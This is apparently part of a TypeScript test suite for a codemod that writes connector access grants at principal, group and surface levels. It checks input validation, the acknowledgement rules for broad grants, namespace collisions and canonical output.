  const wideDelta: AccessDelta = { kind: "grant-connector", scope: { level: "group", group: "eng" }, connector: "linear", credential: "k", allowBroad: "eng shares the read-only Linear key" };
  const wide = applyDelta(emptyGrantsFile(), wideDelta);
  ok(wide.grants.bindings[0].allowBroad === "eng shares the read-only Linear key", "apply(group): the acknowledgement lands on the binding the codemod writes");
  const withoutAck = applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "group", group: "eng" }, connector: "linear", credential: "k" });
  ok(
    lintBroadGrants([...credentialed, ...withoutAck.grants.bundles], [...withoutAck.grants.bindings], [], [broad]).length === 1,
    "apply(group): a broad group grant WITHOUT the acknowledgement fails the CI broad-grant lint",
  );
  ok(
    lintBroadGrants([...credentialed, ...wide.grants.bundles], [...wide.grants.bindings], [], [broad]).length === 0,
    "apply(group): the same grant WITH the acknowledgement passes it",
  );
  const gained = applyDelta(withoutAck.grants, { ...wideDelta, connector: "asana" });
  ok(gained.grants.bindings.filter((b) => b.allowBroad !== undefined).length === 1, "apply(group): a later delta ADDS the acknowledgement to the existing binding (never a second binding)");
  ok(applyDelta(wide.grants, wideDelta).grants.bindings[0].allowBroad === wideDelta.allowBroad, "apply(group): re-apply leaves the acknowledgement exactly as written");
  throwsWith(() => applyDelta(emptyGrantsFile(), { ...wideDelta, allowBroad: "   " }), "EMPTY allowBroad", "apply: an empty acknowledgement is refused (it names no reason)");
}

{
  let g = emptyGrantsFile();
  g = applyDelta(g, { kind: "grant-connector", scope, connector: "linear", credential: "k" }).grants;
  const before = stringifyGrants(g);
  const after = applyDelta(g, { kind: "grant-connector", scope: principalScope, connector: "asana", credential: "k" });
  const surfaceBundle = after.grants.bundles.find((b) => b.name === "grants:slack/T1/C1");
  ok(JSON.stringify(surfaceBundle) === JSON.stringify(g.bundles.find((b) => b.name === "grants:slack/T1/C1")), "invariant(levels): a principal delta leaves the surface bundle byte-identical");
  ok(stringifyGrants(g) === before, "invariant(levels): the input file is untouched (pure)");
  ok(after.grants.bindings.filter((b) => b.scope.level === "principal").length === 1, "invariant(levels): exactly one new binding, at the delta's level");

  const multi: GrantsFile = {
    bundles: [{ name: "grants:principal:slack/T1/U_ME", connectors: [{ name: "linear", credential: "k" }] }],
    bindings: [
      { bundle: "grants:principal:slack/T1/U_ME", scope: { level: "principal", principal: "slack/T1/U_ME" } },
      { bundle: "grants:principal:slack/T1/U_ME", scope: { level: "principal", principal: "slack/T1/U_OTHER" } },
    ],
  };
  const cloned = applyDelta(multi, { kind: "grant-connector", scope: principalScope, connector: "asana", credential: "k" });
  ok(cloned.bundleName === "grants:principal:slack/T1/U_ME#2", "invariant(levels): a multi-bound principal bundle is cloned, never edited");
  ok(JSON.stringify(cloned.grants.bundles[0]) === JSON.stringify(multi.bundles[0]), "invariant(levels): …and the multi-bound bundle comes back byte-identical");

  const crossLevel: GrantsFile = {
    bundles: [{ name: "grants:group:eng", connectors: [{ name: "linear", credential: "k" }] }],
    bindings: [{ bundle: "grants:group:eng", scope: { level: "group", group: "eng" } }],
  };
  const r = applyDelta(crossLevel, { kind: "grant-connector", scope: { level: "principal", principal: "slack/T1/eng" }, connector: "linear", credential: "k" });
  ok(r.changed && r.bundleName === "grants:principal:slack/T1/eng", "invariant(levels): a same-ish address at another level gets its OWN bundle (level+address equality)");
}

{
  const names = [
    overlayBundleName({ level: "surface", surface: "slack/T1/C1" }),
    overlayBundleName({ level: "principal", principal: "slack/T1/U1" }),
    overlayBundleName({ level: "group", group: "eng" }),
    overlayBundleName({ level: "group", group: "principal:slack" }),
    overlayBundleName({ level: "principal", principal: "group/eng" }),
  ];
  ok(new Set(names).size === names.length, "namespace: the level-tagged overlay bundle names are pairwise distinct, including the adversarial spellings");
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "principal", principal: "principal:a/b/c" }, connector: "x", credential: "k" }),
    "well-formed principal key",
    "namespace: a two-slash 'principal' address is refused, so it can never spell a surface-key name",
  );
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "group", group: "eng/sub" }, connector: "x", credential: "k" }),
    "BARE name",
    "namespace: a slash-bearing group name is refused, so it can never spell a surface-key name",
  );
}

{
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "principal", principal: "U_ME" }, connector: "x", credential: "k" }),
    "well-formed principal key",
    "address(principal): a BARE member id is refused (it could never match the resolver's DM branch)",
  );
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "group", group: "  " }, connector: "x", credential: "k" }),
    "group name is empty",
    "address(group): an empty/whitespace name is refused",
  );
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "group", group: "payments team" }, connector: "x", credential: "k" }),
    "BARE name",
    "address(group): whitespace in a group name is refused",
  );
  throwsWith(
    () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "group", group: "directory:Engineering" }, connector: "x", credential: "k" }),
    'reserved "directory:" namespace',
    "address(group): the machine-owned IdP-group namespace is refused — the codemod cannot see that registry, so a grant onto one is a hand PR",
  );

  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:principal:slack/T1/U1", scope: { level: "principal", principal: "U1" } }] }),
    "well-formed principal key",
    "parse: a bare principal address in the overlay refuses",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:group:eng", scope: { level: "group", group: "directory:Eng" } }] }),
    'reserved "directory:" namespace',
    "parse: a directory-namespaced group binding in the overlay refuses",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:group:eng", scope: { level: "group", group: "eng", surface: "slack/T1/C1" } }] }),
    "also sets scope.surface",
    "parse: a second address field on an overlay scope refuses (exactly one address per level)",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:group:eng", scope: { level: "group", group: "eng" }, allowBroad: "" }] }),
    "empty/malformed allowBroad",
    "parse: an empty acknowledgement on an overlay binding refuses",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:group:eng", scope: { level: "group", group: "eng" }, note: "hi" }] }),
    'has field "note"',
    "parse: an unknown field on an overlay binding refuses",
  );
}

{
  const all: GrantsFile = {
    bundles: [
      { name: "grants:group:eng", connectors: [{ name: "linear", credential: "k" }] },
      { name: "grants:principal:slack/T1/U_ME", connectors: [{ name: "asana", credential: "k" }, { name: "linear", credential: "k" }] },
      { name: "grants:slack/T1/C1", connectors: [{ name: "notion", credential: "k" }] },
    ],
    bindings: [
      { bundle: "grants:group:eng", scope: { level: "group", group: "eng" }, allowBroad: "eng shares the read-only key" },
      { bundle: "grants:principal:slack/T1/U_ME", scope: { level: "principal", principal: "slack/T1/U_ME" } },
      { bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C1" } },
    ],
  };
  const mod = emitGrantsModule(all);
  ok(emitGrantsModule(parseGrantsModule(mod)) === mod, "overlays-lint: an overlay carrying all three levels + an acknowledgement is a fixpoint");
  ok(renormalizeGrantsModule(mod) === mod, "overlays-lint: …and is already canonical (normalize is a no-op)");
  const text = stringifyGrants(all);
  ok(text.indexOf('"level"') < text.indexOf('"group"') && text.indexOf('"group"') < text.indexOf('"principal"'), "overlays-lint: scope keys emit in the address-grammar order (level, …, group, principal)");
  ok(text.indexOf('"scope"') < text.indexOf('"allowBroad"'), "overlays-lint: allowBroad emits after the scope it qualifies");
  throwsWith(
    () => parseGrantsModule(mod.replace('"credential": "k"', '"credential": "k", "contentOrigin": "internal"')),
    "carries field(s) contentOrigin",
    "overlays-lint: a hand-edit that adds the deprecated contentOrigin (OPE-2723) to a machine-written bundle is refused, not rewritten — the codemod writes { name, credential } only",
  );
}

{
  const small: Group = { name: "payments-team", members: ["slack/T1/U_ME", "slack/T1/U_TWO"] };
  const broad: Group = { name: "eng", members: [{ linkSet: "ls-1" }] };
  const groupCtx = (name: string, groups: readonly Group[]): PlanContext => ({
    scope: { level: "group", group: name },
    access: resolveAccess({ mode: "dm", platform: "slack", workspace: "T1", channel: "-", principalId: "-", groups: [name] }, codeBundles, [], {}, catalogues),
    bundles: codeBundles,
    connectorCredentials: catalogues,
    groups,
  });

  throwsWith(
    () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, groupCtx("ghosts", [small])),
    "isn't a declared person-group",
    "plan(group): an undeclared group refuses at propose time, with the human-PR fallback",
  );
  throwsWith(
    () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, groupCtx("payments-team", [])),
    "isn't a declared person-group",
    "plan(group): an EMPTY registry refuses every group (fail-closed — unknown never reads as fine)",
  );
  const narrow = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, groupCtx("payments-team", [small]));
  ok(narrow.allowBroad === undefined, "plan(group): a narrow group needs no acknowledgement (and gets none — the lint refuses a pointless one)");

  throwsWith(
    () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, groupCtx("eng", [broad])),
    "needs a reason",
    "plan(group): a BROAD group with no reason refuses — the PR it would open is one CI refuses to merge",
  );
  const acked = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k", reason: "  eng shares\nthe read-only key  " }, groupCtx("eng", [broad]));
  ok(acked.allowBroad === "eng shares the read-only key", "plan(group): the reason becomes the acknowledgement, whitespace-collapsed for the diff");
  ok(grantSentence(acked).includes('person-group "eng" (every member\'s own DM)'), "plan(group): the grant sentence names the universe, not just the address");
  ok(renderDelta(acked).join("\n").includes("allowBroad: eng shares the read-only key"), "plan(group): the acknowledgement is rendered on the card — it is part of the diff being approved");
  const long = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k", reason: "x".repeat(400) }, groupCtx("eng", [broad]));
  ok((long.allowBroad ?? "").length === ALLOW_BROAD_REASON_MAX && long.allowBroad!.endsWith("…"), "plan(group): a runaway reason is capped, visibly");
}

{
  const dmCtx: PlanContext = {
    scope: principalScope,
    access: resolveAccess(meDm, codeBundles, codeBindings, {}, catalogues),
    bundles: codeBundles,
    connectorCredentials: catalogues,
  };
  const d = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, dmCtx);
  ok(d.scope.level === "principal" && d.scope.principal === "slack/T1/U_ME", "plan(principal): the delta targets the caller's own principal key");
  ok(grantSentence(d) === 'Grant connector "linear" (as credential "k") to the personal DM universe of slack/T1/U_ME', "plan(principal): the grant sentence names the personal universe");
  ok(renderDelta(d).join("\n").includes("grant-connector: linear (credential k) → principal:slack/T1/U_ME"), "plan(principal): the machine delta is level-tagged");
  throwsWith(
    () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, { ...dmCtx, scope: { level: "principal", principal: "U_ME" } }),
    "well-formed principal key",
    "plan(principal): a bare principal address is refused defensively at plan time too",
  );
}

console.log(`grants-codemod-test: ${passed} assertions passed`);
